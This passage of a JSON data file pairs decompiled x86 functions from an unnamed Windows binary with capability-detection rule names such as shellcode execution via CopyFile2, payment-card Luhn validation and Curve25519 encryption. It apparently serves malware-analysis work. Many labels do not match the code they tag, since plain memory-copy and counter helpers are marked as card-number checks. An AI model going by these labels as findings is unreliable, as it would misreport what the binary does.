        "decompiled_code": "\nvoid __cdecl fcn.0046c2f8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x16b8) < 0xe) {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n    }\n    else {\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | arg_8h << (*(in_EAX + 0x16b8) & 0x1f);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = arg_8h >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n    }\n    fcn.0046cf5c(1);\n    return;\n}\n",
        "token_count": 438
    },
    "0046ce80": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0046ce80(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x16b8) == 0x10) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b4) = 0;\n        *(in_EAX + 0x16b8) = 0;\n        return;\n    }\n    if (7 < *(in_EAX + 0x16b8)) {\n        iVar1 = *(in_EAX + 0x14);\n        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n        *(*(in_EAX + 8) + iVar1) = *(in_EAX + 0x16b4);\n        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) >> 8;\n        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -8;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "004906d4": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.004906d4(void)\n\n{\n    uint8_t uVar1;\n    uint *in_FS_OFFSET;\n    bool bVar2;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x49075a;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar2 = *0x49ac6c == 0;\n    *0x49ac6c = *0x49ac6c + -1;\n    if (bVar2) {\n        uVar1 = sub.kernel32.dll_GetVersion();\n        *0x49ac68 = 3 < uVar1;\n        fcn.0045da7c();\n        fcn.004190f0();\n        fcn.00419190();\n        fcn.0041913c();\n        fcn.0041913c();\n        fcn.0041913c();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 238
    },
    "00465804": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00465804(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((arg_8h & 0x4000000) != 0) {\n        uVar1 = 0x200;\n    }\n    if ((arg_8h & 0x20000000) == 0) {\n        if ((arg_8h & 0x40000000) == 0) {\n            if ((arg_8h & 0x80000000) == 0) {\n                uVar1 = uVar1 | 1;\n            }\n            else {\n                uVar1 = uVar1 | 8;\n            }\n        }\n        else if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 2;\n        }\n        else {\n            uVar1 = uVar1 | 4;\n        }\n    }\n    else if ((arg_8h & 0x40000000) == 0) {\n        if ((arg_8h & 0x80000000) == 0) {\n            uVar1 = uVar1 | 0x10;\n        }\n        else {\n            uVar1 = uVar1 | 0x80;\n        }\n    }\n    else if ((arg_8h & 0x80000000) == 0) {\n        uVar1 = uVar1 | 0x20;\n    }\n    else {\n        uVar1 = uVar1 | 0x40;\n    }\n    return uVar1;\n}\n",
        "token_count": 358
    },
    "00462000": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00462000(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x462017;\n    fcn.004059cc();\n    uStack28 = 0x46206c;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040a5a8();\n    fcn.00405584();\n    fcn.0040a694();\n    fcn.00405584();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x462073;\n    uStack28 = 0x46206b;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 203
    },
    "00462b38": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00462b38(uint *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x1c) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x3c) = 0;\n    fcn.0040700c();\n    fcn.0040700c();\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    fcn.00404620();\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00462c0c();\n    *arg_8h = uVar1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 402
    },
    "0047fc58": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0047fc58(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x47fc6a;\n    fcn.004059cc();\n    uStack20 = 0x47fc99;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x47fca0;\n    uStack20 = 0x47fc98;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 168
    },
    "00489cb0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00489cb0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x489cc2;\n    fcn.004059cc();\n    uStack20 = 0x489cf1;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405584();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x489cf8;\n    uStack20 = 0x489cf0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 166
    },
    "00433a88": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: uCode\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00433a88(void)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    uint lpString;\n    uint uCode;\n    \n    uCode._0_1_ = in_AL;\n    fcn.00405530();\n    iVar1 = sub.user32.dll_MapVirtualKeyA(uCode, 0);\n    if (iVar1 << 0x10 != 0) {\n        sub.user32.dll_GetKeyNameTextA(iVar1 << 0x10, &lpString, 0x100);\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "00464540": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464540(int32_t *param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iStack32;\n    uint8_t *puStack28;\n    uint8_t *puStack24;\n    int32_t iStack20;\n    \n    fcn.004643e0();\n    iStack20 = (**(*param_1 + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iStack32 = 0;\n        puStack28 = param_2;\n        do {\n            puVar1 = fcn.00429acc();\n            iVar2 = (**(*param_1 + 0x2c))();\n            iVar3 = (**(*param_1 + 0x20))();\n            iVar5 = iStack32;\n            if (iStack32 < 0) {\n                iVar5 = iStack32 + 3;\n            }\n            puVar6 = param_2 + iVar2 * (iVar3 + (iVar5 >> 2));\n            iVar5 = (**(*param_1 + 0x2c))();\n            iVar2 = (**(*param_1 + 0x20))();\n            iVar5 = iVar5 * iVar2;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + 3;\n            }\n            puStack24 = puVar6 + (iVar5 >> 2);\n            uVar4 = (**(*param_1 + 0x2c))();\n            iVar5 = uVar4 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar4 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar2 = *(in_EAX + 0x4c + *puStack28 * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    iVar2 = *(in_EAX + 0x4c + puStack28[1] * 4);\n                    iVar3 = *(in_EAX + 0x84c + *puVar6 * 4) + iVar2;\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x44c + *puVar6 * 4) + iVar2 + *(in_EAX + 0x104c + *puStack24 * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar2 = iVar2 + *(in_EAX + 0xc4c + *puStack24 * 4);\n                    if (iVar2 < 0) {\n                        iVar2 = iVar2 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar2 >> 8));\n                    puVar1 = puVar1 + 6;\n                    puStack28 = puStack28 + 2;\n                    puVar6 = puVar6 + 1;\n                    puStack24 = puStack24 + 1;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iStack32 = iStack32 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 1079
    },
    "00464738": {
        "rules": [
            "decompress data using LZO/83f2e70ad753438b83eb63e4275895e9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464738(uint param_1, uint8_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *extraout_var;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iStack20;\n    \n    fcn.004643e0();\n    piVar6 = extraout_var;\n    iStack20 = (**(*extraout_var + 0x20))();\n    if (-1 < iStack20 + -1) {\n        iVar7 = 0;\n        do {\n            puVar1 = fcn.00429acc(piVar6, iVar7);\n            uVar2 = (**(*piVar6 + 0x2c))();\n            iVar5 = uVar2 >> 1;\n            if (iVar5 < 0) {\n                iVar5 = iVar5 + ((uVar2 & 1) != 0);\n            }\n            if (-1 < iVar5 + -1) {\n                do {\n                    iVar3 = *(in_EAX + 0x4c + *param_2 * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    *puVar1 = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[1] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[2] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    iVar3 = *(in_EAX + 0x4c + param_2[2] * 4);\n                    iVar4 = *(in_EAX + 0x84c + param_2[1] * 4) + iVar3;\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[3] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar4 = *(in_EAX + 0x44c + param_2[1] * 4) + iVar3 + *(in_EAX + 0x104c + param_2[3] * 4);\n                    if (iVar4 < 0) {\n                        iVar4 = iVar4 + 0xff;\n                    }\n                    puVar1[4] = *(in_EAX + 0x184b + (iVar4 >> 8));\n                    iVar3 = iVar3 + *(in_EAX + 0xc4c + param_2[3] * 4);\n                    if (iVar3 < 0) {\n                        iVar3 = iVar3 + 0xff;\n                    }\n                    puVar1[5] = *(in_EAX + 0x184b + (iVar3 >> 8));\n                    puVar1 = puVar1 + 6;\n                    param_2 = param_2 + 4;\n                    iVar5 = iVar5 + -1;\n                } while (iVar5 != 0);\n            }\n            iVar7 = iVar7 + 1;\n            iStack20 = iStack20 + -1;\n        } while (iStack20 != 0);\n    }\n    return;\n}\n",
        "token_count": 892
    },
    "004070e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004070e0(int32_t arg_8h)\n\n{\n    sub.kernel32.dll_InterlockedIncrement(arg_8h + 4);\n    return;\n}\n",
        "token_count": 40
    },
    "004015a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015a0(int32_t param_1, int32_t param_2)\n\n{\n    int64_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    param_1 = param_1 + -0xc;\n    iVar2 = in_EAX + param_1;\n    param_2 = param_2 + param_1;\n    iVar3 = -param_1;\n    if (0 < param_1) {\n        do {\n            iVar1 = *(iVar3 + iVar2);\n            *(iVar3 + 8 + param_2) = ROUND(*(iVar3 + 8 + iVar2));\n            *(iVar3 + param_2) = ROUND(iVar1);\n            iVar3 = iVar3 + 0x10;\n        } while (iVar3 < 0);\n    }\n    *(iVar3 + param_2) = ROUND(*(iVar3 + iVar2));\n    *(iVar3 + 8 + param_2) = *(iVar3 + 8 + iVar2);\n    return;\n}\n",
        "token_count": 235
    },
    "0040248c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040248c(int32_t param_1, int32_t param_2)\n\n{\n    fcn.004030fc();\n    return param_2 + param_1;\n}\n",
        "token_count": 47
    },
    "00402520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402520(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    \n    if (((999 < in_EDX) || (cVar1 = fcn.004024a4(arg_8h),  cVar1 == '\\0')) ||\n       (cVar1 = fcn.004024a4(arg_8h),  cVar1 == '\\0')) {\n        return 0;\n    }\n    if ((in_EAX == *(in_EAX + -0x4c)) &&\n       ((*(in_EAX + -0x24) == 0 ||\n        ((cVar1 = fcn.004024a4(arg_8h),  cVar1 != '\\0' && (cVar1 = fcn.00402520(arg_8h),  cVar1 != '\\0')))))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 211
    },
    "004025a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004025a0(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint uVar2;\n    uint var_10h;\n    \n    uVar2 = *in_EAX;\n    cVar1 = fcn.00402520(&stack0xfffffffc);\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 94
    },
    "00402e04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00402e04(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = *0x49670c;\n    while (iVar1 != 0x496708) {\n        iVar1 = *(iVar1 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    iVar2 = 0x37;\n    iVar1 = 0x49204c;\n    do {\n        *(iVar1 + 0x14) = iVar1;\n        *(iVar1 + 4) = iVar1;\n        *(iVar1 + 8) = 1;\n        *(iVar1 + 0xc) = 0;\n        iVar1 = iVar1 + 0x20;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    *0x496708 = 0x496708;\n    *0x49670c = 0x496708;\n    iVar2 = 0x400;\n    iVar1 = 0x4967a8;\n    do {\n        *iVar1 = iVar1;\n        *(iVar1 + 4) = iVar1;\n        iVar1 = iVar1 + 8;\n        iVar2 = iVar2 + -1;\n        iVar3 = *0x4987b0;\n    } while (iVar2 != 0);\n    while (iVar3 != 0x4987ac) {\n        iVar3 = *(iVar3 + 4);\n        sub.kernel32.dll_VirtualFree();\n    }\n    *0x4987ac = 0x4987ac;\n    *0x4987b0 = 0x4987ac;\n    return;\n}\n",
        "token_count": 370
    },
    "00403098": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403098(int32_t param_1, int32_t param_2, uint8_t *param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    \n    uVar1 = *in_EAX;\n    if (uVar1 == 0) {\n        *param_3 = 0;\n        return;\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\ncode_r0x004030ae:\n        iVar2 = (uVar1 - param_2) + 1;\n        if (-1 < param_1) {\n            if (iVar2 < param_1) {\n                param_1 = iVar2;\n            }\n            goto code_r0x004030b9;\n        }\n    }\n    else if (param_2 <= uVar1) goto code_r0x004030ae;\n    param_1 = 0;\ncode_r0x004030b9:\n    *param_3 = param_1;\n    puVar3 = in_EAX + param_2;\n    for (; param_3 = param_3 + 1,  param_1 != 0; param_1 = param_1 + -1) {\n        *param_3 = *puVar3;\n        puVar3 = puVar3 + 1;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "004030fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nvoid __fastcall fcn.004030fc(uint32_t param_1, int64_t *param_2)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    ushort uVar6;\n    uint uVar7;\n    int64_t *in_EAX;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int64_t *piVar11;\n    bool bVar12;\n    \n    if (in_EAX != param_2) {\n        if (0x20 < param_1) {\n            if (0x20 < param_1) {\n                if ((param_2 < in_EAX) ||\n                   (piVar11 = param_2 - param_1,  param_2 = param_1 + piVar11,  in_EAX <= piVar11)) {\n                    iVar2 = *in_EAX;\n                    piVar11 = (param_1 - 8) + in_EAX;\n                    piVar1 = param_2 + (param_1 - 8);\n                    iVar3 = *piVar11;\n                    iVar8 = ((param_2 & 0xfffffff8) + 8) - piVar1;\n                    do {\n                        *(iVar8 + piVar1) = ROUND(*(iVar8 + piVar11));\n                        bVar12 = SCARRY4(iVar8, 8);\n                        iVar8 = iVar8 + 8;\n                    } while (bVar12 != iVar8 < 0);\n                    *piVar1 = ROUND(iVar3);\n                    *param_2 = ROUND(iVar2);\n                    return;\n                }\n                iVar9 = param_1 - 8;\n                iVar2 = *(iVar9 + in_EAX);\n                iVar3 = *in_EAX;\n                iVar8 = (iVar9 + param_2 & 0xfffffff8U) - param_2;\n                do {\n                    *(iVar8 + param_2) = ROUND(*(iVar8 + in_EAX));\n                    iVar10 = iVar8 + -8;\n                    bVar12 = 7 < iVar8;\n                    iVar8 = iVar10;\n                } while (iVar10 != 0 && bVar12);\n                *param_2 = ROUND(iVar3);\n                *(iVar9 + param_2) = ROUND(iVar2);\n            }\n            return;\n        }\n        iVar8 = param_1 - 8;\n        if (iVar8 == 0 || param_1 < 8) {\n            switch(param_1) {\n            case 0:\n                goto code_r0x00403131;\n            case 1:\n                *param_2 = *in_EAX;\n                return;\n            case 2:\n                *param_2 = *in_EAX;\n                return;\n            case 3:\n                uVar5 = *(in_EAX + 2);\n                *param_2 = *in_EAX;\n                *(param_2 + 2) = uVar5;\n                return;\n            case 4:\n                *param_2 = *in_EAX;\n                return;\n            case 5:\n                uVar5 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar5;\n                return;\n            case 6:\n                uVar6 = *(in_EAX + 4);\n                *param_2 = *in_EAX;\n                *(param_2 + 4) = uVar6;\n                return;\n            case 7:\n                uVar7 = *(in_EAX + 3);\n                *param_2 = *in_EAX;\n                *(param_2 + 3) = uVar7;\n                return;\n            case 8:\n                *param_2 = ROUND(*in_EAX);\n                return;\n            case 9:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xb:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xc:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xd:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0xe:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            default:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x10:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x11:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x12:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x13:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x14:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x15:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x16:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x17:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x19:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1a:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1c:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1e:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x1f:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            case 0x20:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        }\n        iVar2 = *(iVar8 + in_EAX);\n        iVar3 = *in_EAX;\n        if (8 < iVar8) {\n            iVar4 = in_EAX[1];\n            if (0x10 < iVar8) {\n                param_2[2] = ROUND(in_EAX[2]);\n            }\n            param_2[1] = ROUND(iVar4);\n        }\n        *param_2 = ROUND(iVar3);\n        *(iVar8 + param_2) = ROUND(iVar2);\n    }\ncode_r0x00403131:\n    return;\n}\n",
        "token_count": 1536
    },
    "004033b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004033b8(void)\n\n{\n    int32_t iVar1;\n    uchar auStack8 [8];\n    \n    iVar1 = sub.kernel32.dll_QueryPerformanceCounter();\n    if (iVar1 != 0) {\n        *0x492008 = auStack8;\n        return;\n    }\n    *0x492008 = sub.kernel32.dll_GetTickCount();\n    return;\n}\n",
        "token_count": 84
    },
    "00403970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403970(uint8_t param_1, uint8_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    \n    uVar3 = *param_2;\n    uVar2 = *in_EAX + uVar3;\n    if (((!CARRY1(*in_EAX, uVar3)) && (uVar2 <= param_1)) ||\n       (uVar3 = param_1 - *in_EAX,  uVar2 = param_1,  *in_EAX <= param_1 && uVar3 != 0)) {\n        uVar1 = *in_EAX;\n        *in_EAX = uVar2;\n        puVar5 = param_2 + 1;\n        puVar6 = in_EAX + uVar1 + 1;\n        for (uVar4 = uVar3; uVar4 != 0; uVar4 = uVar4 - 1) {\n            *puVar6 = *puVar5;\n            puVar5 = puVar5 + 1;\n            puVar6 = puVar6 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00403af4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403af4(uchar param_1, int32_t param_2)\n\n{\n    ulong uVar1;\n    ulong *in_EAX;\n    ushort uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    \n    uVar2 = CONCAT11(param_1, param_1);\n    if (0x1f < param_2) {\n        *in_EAX = uVar2;\n        *(in_EAX + 2) = uVar2;\n        *(in_EAX + 4) = uVar2;\n        *(in_EAX + 6) = uVar2;\n        uVar1 = *in_EAX;\n        *(param_2 + -0x10 + in_EAX) = uVar1;\n        *(param_2 + -8 + in_EAX) = uVar1;\n        iVar3 = (in_EAX & 7) - 8;\n        iVar4 = param_2 + -0x10 + iVar3;\n        iVar3 = iVar4 - iVar3;\n        iVar4 = -iVar4;\n        do {\n            *(in_EAX + iVar4 + iVar3) = uVar1;\n            *(in_EAX + iVar4 + 8 + iVar3) = uVar1;\n            bVar5 = SCARRY4(iVar4, 0x10);\n            iVar4 = iVar4 + 0x10;\n        } while (bVar5 != iVar4 < 0);\n        return;\n    }\n    *(param_2 + -1 + in_EAX) = param_1;\n    switch(param_2) {\n    default:\n        return;\n    case 0x1e:\n    case 0x1f:\n        *(in_EAX + 0x1c) = uVar2;\n    case 0x1c:\n    case 0x1d:\n        